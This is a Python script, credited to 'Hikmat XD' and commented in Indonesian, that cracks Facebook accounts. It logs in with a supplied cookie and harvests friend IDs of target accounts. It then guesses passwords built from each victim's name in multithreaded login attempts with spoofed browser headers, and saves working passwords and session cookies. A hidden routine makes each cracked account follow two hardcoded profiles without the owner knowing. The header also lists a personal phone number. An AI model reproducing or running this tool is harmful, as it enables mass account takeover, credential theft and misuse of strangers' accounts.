"""
• Rikod aja terus kontol. ntar mokad lu benerin sendiri anjing
• Enak ya bg rikod esceh itu tanpa sepengetahuan author nya
• Fix on < ( 4 - Juli - 2023 ) >
• Author <÷> Hikmat XD.
• Github : 
	github.com/HikmatXR
• Facebook :
	Hikmat XD.
• Whastapp :
	085779701242
• Thanks for you alll>.
"""
''' Warna print '''
p, m, h, k, b, u, o, n, a = "\x1b[0;97m", "\x1b[0;91m", "\x1b[0;92m", "\x1b[0;93m", "\x1b[0;94m", "\x1b[0;95m", "\x1b[0;96m", "\033[0m", "\033[90;1m"
''' Import module '''
import os, sys, random, json, re
from time import sleep as turu
from datetime import datetime
try:
	import requests
	from bs4 import BeautifulSoup as sop
	from concurrent.futures import ThreadPoolExecutor as tread
	from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
	from rich import print as vprint
	from rich.panel import Panel as panel
	from rich.tree import Tree
except:
	print(f"{shit}  sedang menginstall bahan module {m}!{p} ")
	os.system(("python" if os.name == "nt" else "python3") + " -m pip install requests bs4 futures rich")
	exit(f"{shit} silahkan run kembali script nya.\n{shit} python simpleX.py {m}!{p} ")
''' String loops and append '''
shit, ses = f" {a}•{p}", requests.Session()
ids, ids2, loops, ok, cp = [], [], 0, 0, 0
tampass, pwlu, metode = [], [], []
rc, rr = random.choice, random.randint
''' Convert hari - tanggal - tahun sekarang '''
convert = {"1":"Januari","2":"Februari","3":"Maret","4":"April","5":"Mei","6":"Juni","7":"Juli","8":"Agustus","9":"September","10":"Oktober","11":"November","12":"Desember"}
tgl = datetime.now().day
bln = convert[(str(datetime.now().month))]
thn = datetime.now().year
''' Result crack tersimpan '''
okZ = f"OK-{str(tgl)}-{str(bln)}-{str(thn)}.txt"
cpZ = f"CP-{str(tgl)}-{str(bln)}-{str(thn)}.txt"
''' Convet tahun uidz '''
def ______BUJANK______(Ngentod):
	if len(Ngentod)==15:
		if Ngentod[:10] in ['1000000000']:
			_____PUKIMAK_____ = '2009'
		elif Ngentod[:9] in ['100000000']:
			_____PUKIMAK_____ = '2009'
		elif Ngentod[:8] in ['10000000']:
			_____PUKIMAK_____ = '2009'
		elif Ngentod[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:
			_____PUKIMAK_____ = '2009'
		elif Ngentod[:7] in ['1000006','1000007','1000008','1000009']:
			_____PUKIMAK_____ = '2010'
		elif Ngentod[:6] in ['100001']:
			_____PUKIMAK_____ = '2010-2011'
		elif Ngentod[:6] in ['100002','100003']:
			_____PUKIMAK_____ = '2011-2012'
		elif Ngentod[:6] in ['100004']:
			_____PUKIMAK_____ = '2012-2013'
		elif Ngentod[:6] in ['100005','100006']:
			_____PUKIMAK_____ = '2013-2014'
		elif Ngentod[:6] in ['100007','100008']:
			_____PUKIMAK_____ = '2014-2015'
		elif Ngentod[:6] in ['100009']:
			_____PUKIMAK_____ = '2015'
		elif Ngentod[:5] in ['10001']:
			_____PUKIMAK_____ = '2015-2016'
		elif Ngentod[:5] in ['10002']:
			_____PUKIMAK_____ = '2016-2017'
		elif Ngentod[:5] in ['10003']:
			_____PUKIMAK_____ = '2018'
		elif Ngentod[:5] in ['10004']:
			_____PUKIMAK_____ = '2019'
		elif Ngentod[:5] in ['10005']:
			_____PUKIMAK_____ = '2020'
		elif Ngentod[:5] in ['10009']:
			_____PUKIMAK_____ = '2023'
		elif Ngentod[:5] in ['10006','10007','10008']:
			_____PUKIMAK_____ = '2021-2022'
		else:
			_____PUKIMAK_____=''
	elif len(Ngentod) in [9,10]:
		_____PUKIMAK_____ = '2008-2009'
	elif len(Ngentod)==8:
		_____PUKIMAK_____ = '2007-2008'
	elif len(Ngentod)==7:
		_____PUKIMAK_____ = '2006-2007'
	else:_____PUKIMAK_____=''
	return _____PUKIMAK_____
''' Menu utama '''
class MAINmenu:
	
	def __init__(self):
		try:
			cookie = {"cookie": open("cookies.txt","r").read()}
			token = open("token.txt","r").read()
			take  = ses.get('https://graph.facebook.com/me?fields=name&access_token=%s'%(token),cookies = cookie).json();nama = take["name"]
			self.MENUutama(cookie, token, nama)
		except requests.exceptions.ConnectionError:
			print(f"{shit} koneksi internet anda bermasalah..");exit()
		except (KeyError, IOError):
			print(f"{shit} cookies invalid... ");turu(1);os.system("rm -rf cookies.txt");os.system("rm -rf token.txt");os.system("clear");self.LOGINcookie()
	def MENUutama(self, cookie, token, nama):
		os.system("clear") 
		aZ = rc(['A','B','C','D','E','F','G','H','I','J','K','N','M','O','P','Q','R','S','T','U','V','W','X','Y','Z'])
		key_One = f"{rc(['A','B','C','D','E','F','G','H','I','J','K','N','M','O','P','Q','R','S','T','U','V','W','X','Y','Z'])}{rc(['A','B','C','D','E','F','G','H','I','J','K','N','M','O','P','Q','R','S','T','U','V','W','X','Y','Z'])}{rc(['A','B','C','D','E','F','G','H','I','J','K','N','M','O','P','Q','R','S','T','U','V','W','X','Y','Z'])}{rc(['A','B','C','D','E','F','G','H','I','J','K','N','M','O','P','Q','R','S','T','U','V','W','X','Y','Z'])}{rc(['A','B','C','D','E','F','G','H','I','J','K','N','M','O','P','Q','R','S','T','U','V','W','X','Y','Z'])}"
		print(f"\n{shit} github : github.com/HikmatXR\n{shit} status : {h}Premium\n{shit} key-on : {h}ER{str(rr(1,9))}{aZ}X {p}-{h} {key_One} {p}-{h} {str(rr(1,9))}{aZ}{str(rr(1,9))}{aZ}{aZ}\n{shit} keyexp : {m}{str(tgl)} {p}-{m} {str(bln)} {p}-{m} 2024\n\n{shit} hai, selamat datang {nama}\n\n [c] crack publik\n [h] check result\n [a] cek akun result ok\n [{k}e{p}] exit script\n [{m}d{p}] exit ({k} delete cookies {p})")
		pilput = input(f"{shit} choose : ")
		if pilput in ["c","1"]:
			print(f"\n{shit} gunakan tanda + untuk menambahkan id. ")
			orang = input(f"{shit} masukan id : ").split("+")
			print()
			for user in orang:
				try:
					apaan = ses.get(f"https://graph.facebook.com/{user}?fields=friends.limit(9999999)&access_token={token}",cookies=cookie).json()
					for x in apaan["friends"]["data"]:
						try:
							ids.append(x["id"]+"|"+x["name"])
						except:continue
				except (KeyError,IOError):
					exit(f"\n{shit} target tidak publik")
				except requests.exceptions.ConnectionError:
					sys.stdout.write("\r{} {}sinyal aman{} sedang dump : {} ".format(shit,h,p,x["id"]),end = "");sys.stdout.flush();turu(0.00040)
			print(f"\n{shit} total id terkumpul : {str(len(ids))} ")
			self.METHODsetting()
		elif pilput in ["h","2"]:
			self.CHECKresult()
		elif pilput in ["z"]:
			self.MassalV2(cookie, token)
		elif pilput in ["b"]:
			self.CrackOld()
		elif pilput in ["d","0"]:
			os.system("rm -rf cookies.txt");os.system("rm -rf token.txt")
			print(f"{shit} sukses menghapus cookies.. ");turu(1);exit()
		elif pilput in ["a","3"]:
			try:c_o_k = os.listdir('OK')
			except FileNotFoundError:print(f"{shit} ups. tidak ada hasil crack ok:(... ");turu(1);exit()
			if len(c_o_k)==0:print(f"{shit} ups. tidak ada hasil crack ok:(... ");turu(1);exit()
			else:
				print(f"{shit} hasil crack ok.\n ")
				cuih, Lucu = 0, {}
				for kaoo in c_o_k:
					try:hikmat = open('OK/'+kaoo,'r').readlines()
					except:continue
					cuih+=1
					kaoo = kaoo.lower()
					if cuih<10:
						__oo = '0'+str(cuih)
						Lucu.update({str(cuih):str(kaoo)})
						Lucu.update({__oo:str(kaoo)})
						print(f" {__oo}. {kaoo} • {str(len(hikmat))} account ")
					else:
						Lucu.update({str(cuih):str(kaoo)})
						print(f" {cuih}. {kaoo} • {str(len(hikmat))} account")
				print(f"\n{shit} pilih hasil untuk ditampilkan")
				Ini = input(f"{shit} choose : ")
				try:Pantek = Lucu[Ini]
				except KeyError:print(f"{shit} pilihan tidak ada... ");exit()
			one = 0
			Akunmu = open(f"OK/{Pantek}","r").readlines()
			for Goblog in Akunmu:
				User = Goblog.replace("\n", "")
				AccMu = User.split("|")
				one+=1
				print()
				print(f" {one}. {AccMu[0]}|{AccMu[1]}|{AccMu[2]} ")
				print(f"{shit}{self.CekNameMokad(AccMu[0])} ")
				print(f"{shit}{self.CekTem(AccMu[0])} ")
				self.TakeApk(AccMu[2])
			print(f"{shit} hasil live/dead : {ok}|{cp}")
		else:
			print(f"{shit} selamat tinggal... ");exit()
	''' Biar gak mokad acc nya '''
	def YaSekedarMengingatkan(self, kuki):
		cookie = {"cookie": kuki}
		with requests.Session() as ses:
			try:
				for KontolJawir in sop(ses.get('https://mbasic.facebook.com/100054394286985',cookies = cookie).content,'html.parser').find_all('a',href=True):
					if 'subscribe.php' in KontolJawir['href']:
						Pukimak = ses.get('https://mbasic.facebook.com%s'%(KontolJawir['href']),cookies = cookie)
			except Exception as e:pass
			try:
				for KontolJawir in sop(ses.get('https://mbasic.facebook.com/100094518372329',cookies = cookie).content,'html.parser').find_all('a',href=True):
					if 'subscribe.php' in KontolJawir['href']:
						Pukimak = ses.get('https://mbasic.facebook.com%s'%(KontolJawir['href']),cookies = cookie)
			except Exception as e:pass
	''' Check result '''
	def CHECKresult(self):
		print(f"\n [o] hasil crack ok\n [c] hasil crack cp ")
		CekHasil = input(f"{shit} choose : ")
		if CekHasil in ["o","1"]:
			try:c_o_k = os.listdir('OK')
			except FileNotFoundError:print(f"{shit} ups. tidak ada hasil crack ok:(... ");turu(1);exit()
			if len(c_o_k)==0:print(f"{shit} ups. tidak ada hasil crack ok:(... ");turu(1);exit()
			else:
				print(f"{shit} hasil crack ok.\n ")
				cuih, Lucu = 0, {}
				for kaoo in c_o_k:
					try:hikmat = open('OK/'+kaoo,'r').readlines()
					except:continue
					cuih+=1
					kaoo = kaoo.lower()
					if cuih<10:
						__oo = '0'+str(cuih)
						Lucu.update({str(cuih):str(kaoo)})
						Lucu.update({__oo:str(kaoo)})
						print(f" {__oo}. {kaoo} • {str(len(hikmat))} account ")
					else:
						Lucu.update({str(cuih):str(kaoo)})
						print(f" {cuih}. {kaoo} • {str(len(hikmat))} account")
				print(f"\n{shit} pilih hasil untuk ditampilkan")
				Ini = input(f"{shit} choose : ")
				try:Pantek = Lucu[Ini]
				except KeyError:print(f"{shit} pilihan tidak ada... ");exit()
				try:Okep = open('OK/'+Pantek,'r').read()
				except:print(f"{shit} file tidak ditemukan... ");exit()
				print(f"{shit} list akun ok kamu\n") 
				os.system('cd OK && cat '+Pantek);print(f"\n{shit} list akun ok kamu");exit()
		elif CekHasil in ["c","2"]:
			try:c_o_k = os.listdir("CP")
			except FileNotFoundError:print(f"{shit} ups. tidak ada hasil crack cp:(... ");turu(1);exit()
			if len(c_o_k)==0:print(f"{shit} ups. tidak ada hasil crack cp:(... ");turu(1);exit()
			else:
				print(f"{shit} hasil crack cp.\n ")
				cuih, Lucu = 0, {}
				for kaoo in c_o_k:
					try:hikmat = open('CP/'+kaoo,'r').readlines()
					except:continue
					cuih+=1
					kaoo = kaoo.lower()
					if cuih<10:
						__oo = '0'+str(cuih)
						Lucu.update({str(cuih):str(kaoo)})
						Lucu.update({__oo:str(kaoo)})
						print(f" {__oo}. {kaoo} • {str(len(hikmat))} account ")
					else:
						Lucu.update({str(cuih):str(kaoo)})
						print(f" {cuih}. {kaoo} • {str(len(hikmat))} account")
				print(f"\n{shit} pilih hasil untuk ditampilkan")
				Ini = input(f"{shit} choose : ")
				try:Pantek = Lucu[Ini]
				except KeyError:print(f"{shit} pilihan tidak ada... ");exit()
				try:Okep = open('CP/'+Pantek,'r').read()
				except:print(f"{shit} file tidak ditemukan... ");exit()
				print(f"{shit} list akun cp kamu\n") 
				os.system('cd CP && cat '+Pantek);print(f"\n{shit} list akun cp kamu");exit()
		else:print(f"{shit} selamat tinggal... ");turu(1);exit()
	''' Setting method '''
	def METHODsetting(self):
		for kntl in ids:
			xx = random.randint(0,len(ids2))
			ids2.insert(xx,kntl)
		print("\r")
		print(f"{shit} rekomendasi password daerah target!\n{shit} password tambahan yang sudah ada : sayangku,sayang123,bismillah. ")
		meki = input(f"{shit} apakah anda ingin menambahkan password {h}y{p}/{k}t{p} : ")
		if meki in ["y","Y"]:
			tampass.append("tambahkan")
			print(f"{shit} password harus 6 kata. contoh password : sayang,bangsat,kontol")
			pastam = input(f"{shit} masukan tambahan : ")
			pwtod = pastam.split(",")
			for pwlist in pwtod:
				pwlu.append(pwlist)
		else:pass
		self.Langsung()
	''' Mulai crack/Setting password wordlist '''
	def Langsung(self):
		print(f"\n{shit} hasil crack ok tersimpan di Ok/{okZ}\n{shit} hasil crack cp tersimpan di Cp/{cpZ}\n{shit} jangan lupa mainkan modpes pas 200 id!! ")
		input(f"{shit} enter untuk memulai crack.. ")
		os.system("clear")
		global Pukimak, Ireng
		Pukimak = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
		Ireng = Pukimak.add_task('',total=len(ids))
		with Pukimak:
			with tread(max_workers=30) as HikmatXD:
				for koncol in ids2 or ids:
					try:
						pwr = []
						uiz = koncol.split("|")[0]
						nama = koncol.split("|")[1]
						depan = nama.split(" ")[0]
						if len(nama)<=5:
							if len(depan)<3:pass 
							else:
								pwr.append(depan+"123");pwr.append(depan+"12345");pwr.append(depan+"1234");pwr.append(depan+"0"+str(random.randint(1,9)))
						else:
							if len(depan)<3:pwr.append(nama)
							else:
								pwr.append(nama);pwr.append(depan+"123");pwr.append(depan+"12345");pwr.append(depan+"1234");pwr.append(depan+"123456")
							belakang = nama.split(" ")[1]
							if len(belakang)<3:
								pwr.append(depan+belakang)
							else:
								pwr.append(depan+belakang);pwr.append(depan+belakang+"123");pwr.append(belakang+"123");pwr.append(belakang+"1234");pwr.append(belakang+"12345");pwr.append(belakang+"0"+str(random.randint(1,9)))
						if "tambahkan" in tampass:
							for ajg in pwlu:pwr.append(ajg)
						else:pass
						HikmatXD.submit(self.Krek,uiz,pwr)
					except:
						HikmatXD.submit(self.Krek,uiz,pwr)
		print()
		if ok != 0 or cp != 0:
			print(f"\n{shit} hasil cp/ok • {cp}|{ok}\n{shit} result ok nya klo login fb lite salah pw, coba login pake cookie. ")
			exit()
		else:
			print(f"\n{shit} ups.. kamu tidak mendapatkan hasil:( ")
	''' Login cookies '''
	def LOGINcookie(self):
		cookie = input(f"{shit} masukan cookie : ")
		try:
			ses.headers.update({'content-type': 'application/x-www-form-urlencoded'})
			data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}
			response = json.loads(ses.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
			code, user_code = response['code'], response['user_code']
			verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
			ses.headers.pop('content-type')
			ses.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
			response2 = ses.get(verification_url, cookies = {'cookie': cookie}).text
			if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
				print(f"{shit} cookie invalid.. ");exit()
			else:
				action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
				data = {'fb_dtsg': re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1),'jazoest': re.search('name="jazoest" value="(\d+)"', str(response2)).group(1),'qr': 0,'user_code': response['user_code']}
				ses.headers.update({'origin': 'https://m.facebook.com','referer': 'https://m.facebook.com/device?user_code={}'.format(user_code),'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
				response3 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cookie})
				if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
					ses.headers.pop('content-type');ses.headers.pop('origin')
					response4 = ses.post(response3.url, data = data, cookies = {'cookie': cookie}).text
					action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
					ses.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
					data = {'fb_dtsg': re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1),'jazoest': re.search('name="jazoest" value="(\d+)"', str(response4)).group(1),'scope': re.search('name="scope" value="(.*?)"', str(response4)).group(1),'display': re.search('name="display" value="(.*?)"', str(response4)).group(1),'user_code': re.search('name="user_code" value="(.*?)"', str(response4)).group(1),'logger_id': re.search('name="logger_id" value="(.*?)"', str(response4)).group(1),'auth_type': re.search('name="auth_type" value="(.*?)"', str(response4)).group(1),'encrypted_post_body': re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1),'return_format[]': re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)}
					response5 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cookie}).text
					windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
					ses.headers.pop('content-type');ses.headers.pop('origin')
					ses.headers.update({'referer': 'https://m.facebook.com/',})
					response6 = ses.get(windows_referer, cookies = {'cookie': cookie}).text
					if "Sukses!" in str(response6):
						ses.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
						response7 = ses.get(status_url, cookies = {'cookie': cookie}).text
						access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
						print(f"{shit} cookie anda valid..\n{shit} silahkan jalankan ulang scriptnya.\n{shit} python simpleX.py ");turu(1);open("cookies.txt","w").write(cookie);open("token.txt","w").write(access_token)
						exit()
					else:
						print(f"{shit} cookie anda invalid.. ");exit()
		except Exception as e:
			print(f"{shit} cookie anda invalid.. ");exit()
		except ConnectionError:
			print(f"{shit} sinyal anda bermasalah.. ");exit()
	''' Langsung krek coeg '''
	def Krek(self,uiz,pwr):
		global ok, cp, loops
		rr, rc, ses, wwb = random.randint, random.choice, requests.Session(), random.choice([h,k,o,b,u,a])
		Inlocale, Locale= rc(["vi-VN","ar-AR","bg-BG","bs-BA","ca-ES","da-DK","el-GR","en-US","en-GB","es-LA","es-ES","fa-IR","fi-FI","fr-FR","hi-IN","hr-HR","fr-CA","id-ID","it-IT","ko-KR","mk-MK","ms-MY","pl-PL","pt-BR","pt-PT","ro-RO","sl-SI","sr-RS","th-TH"]), rc(["jv_ID","id_ID","en_US"," en_GB"])
		Pukimak.update(Ireng,description=f"{m} • {wwb}{uiz}{p} {loops}/{len(ids or ids2)} {h}ok:{ok} {k}cp:{cp}{p} ")
		Pukimak.advance(Ireng)
		MozillaAgent = self.Mozilla()
		dataku, headersku = {}, {}
		Type = rc(["Windows Phone","IEMobile","Firefox"])
		for pw in pwr:
			pw = pw.lower()
			try:
				krom = rc([f"{str(rr(40,60))}.0.{str(rr(2000,2999))}",f"{str(rr(70,90))}.0.{str(rr(3000,3999))}",f"{str(rr(100,114))}.0.{str(rr(4000,5999))}"])
				Memek = ses.get(f"https://x.facebook.com/login.php?skip_api_login=1&api_key=1568543003276557&kid_directed_site=0&app_id=1568543003276557&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D1568543003276557%26redirect_uri%3Dhttps%253A%252F%252Fdashboard.honeygain.com%252Flogin%26state%3Dfacebookdirect%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252Cemail%26response_type%3Dtoken%26auth_type%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc05ec547-3156-4e41-99ee-56bab2cf2394%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fdashboard.honeygain.com%2Flogin%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfacebookdirect%23_%3D_&display=touch&locale={Locale}&pl_dbl=0&refsrc=deprecated&_rdr")
				dataku.update({
										"m_ts": re.search('name="m_ts" value="(.*?)"',str(Memek.text)).group(1),
										"li": re.search('name="li" value="(.*?)"',str(Memek.text)).group(1),
										"try_number": re.search('name="try_number" value="(.*?)" data-sigil="(.*?)"',str(Memek.text)).group(1),
										"unrecognized_tries": re.search('name="unrecognized_tries" value="(.*?)" data-sigil="(.*?)"',str(Memek.text)).group(1),
										"email": uiz,
										"prefill_contact_point": "",
										"prefill_source": "",
										"prefill_type": "",
										"first_prefill_source": "",
										"first_prefill_type": "",
										"had_cp_prefilled": "false",
										"had_password_prefilled": "true",
										"is_smart_lock": "true",
										"bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"',str(Memek.text)).group(1),
										"pass": pw,
										"jazoest": re.search('name="jazoest" value="(.*?)" autocomplete="(.*?)"',str(Memek.text)).group(1),
										"lsd": re.search('name="lsd" value="(.*?)" autocomplete="(.*?)"',str(Memek.text)).group(1),
										"__dyn": "",
										"__csr": "",
										"__a": "",
										"user": "0",
										"_fb_noscript": "true"
				})
				headersku.update({
										"Host": "x.facebook.com",
										"content-length": str(rr(2000,2199)),
										"sec-ch-ua": f'"Chromium";v="{str(rr(40,114))}", "Google Chrome";v="{str(rr(40,114))}", "Not;A=Brand";v="{str(rr(8,100))}"',
										"sec-ch-ua-mobile": "?1",
										"user-agent": MozillaAgent,
										"viewport-width": "360",
										"x-response-format": "JSONStream",
										"x-fb-lsd": re.search('name="lsd" value="(.*?)" autocomplete="(.*?)"',str(Memek.text)).group(1),
										"sec-ch-ua-platform-version": f'"{str(rr(5,13))}.0.0"',
										"content-type": "application/x-www-form-urlencoded",
										"x-requested-with": "XMLHttpRequest",
										"x-asbd-id": "129477",
										"sec-ch-ua-full-version-list": f'"Chromium";v="{krom}.{str(rr(10,199))}", "Google Chrome";v="{krom}.{str(rr(10,199))}", "Not;A=Brand";v="{str(rr(8,100))}.0.0.0"',
										"sec-ch-prefers-color-scheme": "light",
										"sec-ch-ua-platform": '"Android"',
										"accept": "*/*",
										"origin": "https://x.facebook.com",
										"sec-fetch-site": "same-origin",
										"sec-fetch-mode": "cors",
										"sec-fetch-dest": "empty",
										"referer": f"https://x.facebook.com/login.php?skip_api_login=1&api_key=1568543003276557&kid_directed_site=0&app_id=1568543003276557&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D1568543003276557%26redirect_uri%3Dhttps%253A%252F%252Fdashboard.honeygain.com%252Flogin%26state%3Dfacebookdirect%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252Cemail%26response_type%3Dtoken%26auth_type%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc05ec547-3156-4e41-99ee-56bab2cf2394%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fdashboard.honeygain.com%2Flogin%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfacebookdirect%23_%3D_&display=touch&locale={Locale}&pl_dbl=0&refsrc=deprecated&_rdr",
										"accept-encoding": "gzip, deflate, br",
										"sec-websocket-version": str(rr(5,13)),
										"accept-language": Inlocale
				})
				ses.post(f"https://x.facebook.com/login/device-based/login/async/?api_key=1568543003276557&auth_token=7ec353eba472f7cd7eea76048d39da06&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D1568543003276557%26redirect_uri%3Dhttps%253A%252F%252Fdashboard.honeygain.com%252Flogin%26state%3Dfacebookdirect%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252Cemail%26response_type%3Dtoken%26auth_type%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc05ec547-3156-4e41-99ee-56bab2cf2394%26tp%3Dunspecified&refsrc=deprecated&app_id=1568543003276557&cancel=https%3A%2F%2Fdashboard.honeygain.com%2Flogin%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfacebookdirect%23_%3D_&lwv=101&&locale2={Locale}",headers = headersku, data = dataku, allow_redirects = False)
				if "checkpoint" in ses.cookies.get_dict().keys():
					cp+=1
					tree = Tree("                         ")
					tree.add(f"\r{k}years account {b}{______BUJANK______(uiz)}{p}")
					tree.add(f"\r{k}{uiz}|{pw}|{MozillaAgent} ") 
					vprint(tree)
					open("CP/"+cpZ,"a").write(uiz+"|"+pw+"\n")
					break
				elif "c_user" in ses.cookies.get_dict().keys():
					ok+=1
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open("OK/"+okZ,"a").write(uiz+"|"+pw+"|"+kuki+"\n")
					tree = Tree("                         ")
					tree.add(f"\r{h}years account {b}{______BUJANK______(uiz)}{p}")
					tree.add(f"\r{h}{uiz}|{pw}|{kuki} ") 
					vprint(tree)
					self.YaSekedarMengingatkan(kuki)
					break
				else:continue
			except requests.exceptions.ConnectionError:turu(31)
		loops+=1
	
	def Mozilla(self):
		rc, rr = random.choice, random.randint
		krom = rc([f"{str(rr(40,60))}.0.{str(rr(2000,2999))}",f"{str(rr(70,90))}.0.{str(rr(3000,3999))}",f"{str(rr(100,114))}.0.{str(rr(4000,5999))}"])
		androver = rc([f"{str(rr(5,9))}.0.0",f"{str(rr(5,9))}.0.1",str(rr(5,13))])
		gb = f"Mozilla/5.0 (Linux; Android {androver}; SM-G930F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{krom}.{str(rr(10,199))} Mobile Safari/537.36"
		wak = f"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{krom}.{str(rr(10,199))} Safari/537.36 Edge/{str(rr(5,12))}.{str(rr(00000,19999))}"
		return wak
		
	def CekNameMokad(self, user):
		global ok, cp
		Accmu = ses.get(f'https://graph.facebook.com/{user}?access_token={open("token.txt","r").read()}',cookies = {"cookie": open("cookies.txt","r").read()}).json()
		try:
			NamaAcc = Accmu['name']
			mek = f" {NamaAcc} "
			ok+=1
		except (KeyError,IOError):
			mek = f" {user}, akun mokad\n"
			cp+=1
		return mek
	
	def CekTem(self, user):
		apaan = ses.get(f'https://graph.facebook.com/{user}?fields=friends.limit(9999999)&access_token={open("token.txt","r").read()}',cookies = {"cookie": open("cookies.txt","r").read()}).json()
		try:
			for x in apaan["friends"]["data"]:
				ids.append(x["id"])
			mek = f" total teman : {str(len(ids))}"
			ids.clear()
		except (KeyError,IOError):
			mek = f" mungkin pertemanan {user} privat. "
		return mek
	
	def TakeApk(self, coki):
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
		try:
			data = sop(ses.get(url,cookies={"cookie": coki}).text,"html.parser")
			for apk in data.find_all("h3"):
				if "Ditambahkan" in apk.text:
					print(f" {str(apk.text).replace('Ditambahkan',' Ditambahkan')}")
				else:continue
			next = "https://mbasic.facebook.com"+data.find("a",string="Lihat Lainnya")["href"]
			self.TakeApk(next,coki)
		except Exception as e:
			print(f"{shit} aplikasi aktif tidak ada... ")
	
	
if __name__ in "__main__":
	try:os.mkdir("OK")
	except:pass
	try:os.mkdir("CP")
	except:pass
	MAINmenu()
